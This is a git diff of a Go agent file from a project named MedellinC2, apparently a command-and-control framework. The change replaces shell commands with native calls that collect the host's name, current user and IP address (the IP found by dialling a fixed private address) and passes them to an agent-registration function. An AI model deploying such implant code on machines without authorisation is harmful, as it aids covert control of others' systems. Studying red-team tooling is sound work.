@@ -5,10 +5,10 @@ Copyright © 2022 NAME HERE <EMAIL ADDRESS>
 package cmd
 
 import (
-	"bytes"
 	"fmt"
-	"log"
-	"os/exec"
+	"net"
+	"os"
+	"os/user"
 
 	"github.com/google/uuid"
 	"github.com/megatop1/MedellinC2/data"
@@ -24,19 +24,36 @@ var agentCmd = &cobra.Command{
 	`,
 }
 
+func GetHostIP() (hostIP net.IP) {
+	conn, err := net.Dial("udp", "172.23.252.10:80")
+	if err != nil {
+		os.Exit(1)
+	}
+	defer conn.Close()
+
+	// We only want the IP, not "IP:port"
+	hostIP = conn.LocalAddr().(*net.UDPAddr).IP
+
+	return
+}
+
 func getAgentInfo() {
 	//get the hostname
-	hostname, err := exec.Command("hostname", "-f").Output() // Agent's hostname
+	hostname, err := os.Hostname()
 	if err != nil {
-		log.Fatal(err)
+		fmt.Println(err)
+		os.Exit(1)
 	}
+	fmt.Printf("Hostname: %s", hostname)
+	print("\n")
 
-	hostnameResult := bytes.NewBuffer(hostname).String()
-	fmt.Println("Hostname: ", hostnameResult)
 	//get the user
-	user, err := exec.Command("whoami").Output() // Agent's Username
-	userResult := bytes.NewBuffer(user).String()
-	fmt.Println("Username: ", userResult)
+	user, err := user.Current()
+	if err != nil {
+		panic(err)
+	}
+	fmt.Printf("Username: %s", user.Username)
+	print("\n")
 
 	//generate UUID
 	//Code to randomly generate UUID
@@ -46,12 +63,10 @@ func getAgentInfo() {
 	print("\n")
 
 	//get the IP
-	ipcmd := "hostname -I"
-	ipaddress, err := exec.Command(ipcmd).Output()
-	ipResult := bytes.NewBuffer(ipaddress).String()
-	fmt.Println("IP Address: ", ipResult)
+	ipResult := GetHostIP().String()
+	print("IP Address: " + ipResult)
 
-	generateAgent(id, ipResult, hostnameResult)
+	generateAgent(id, ipResult, hostname)
 }
 
 func generateAgent(UUID, RemoteIP string, Hostname string) {
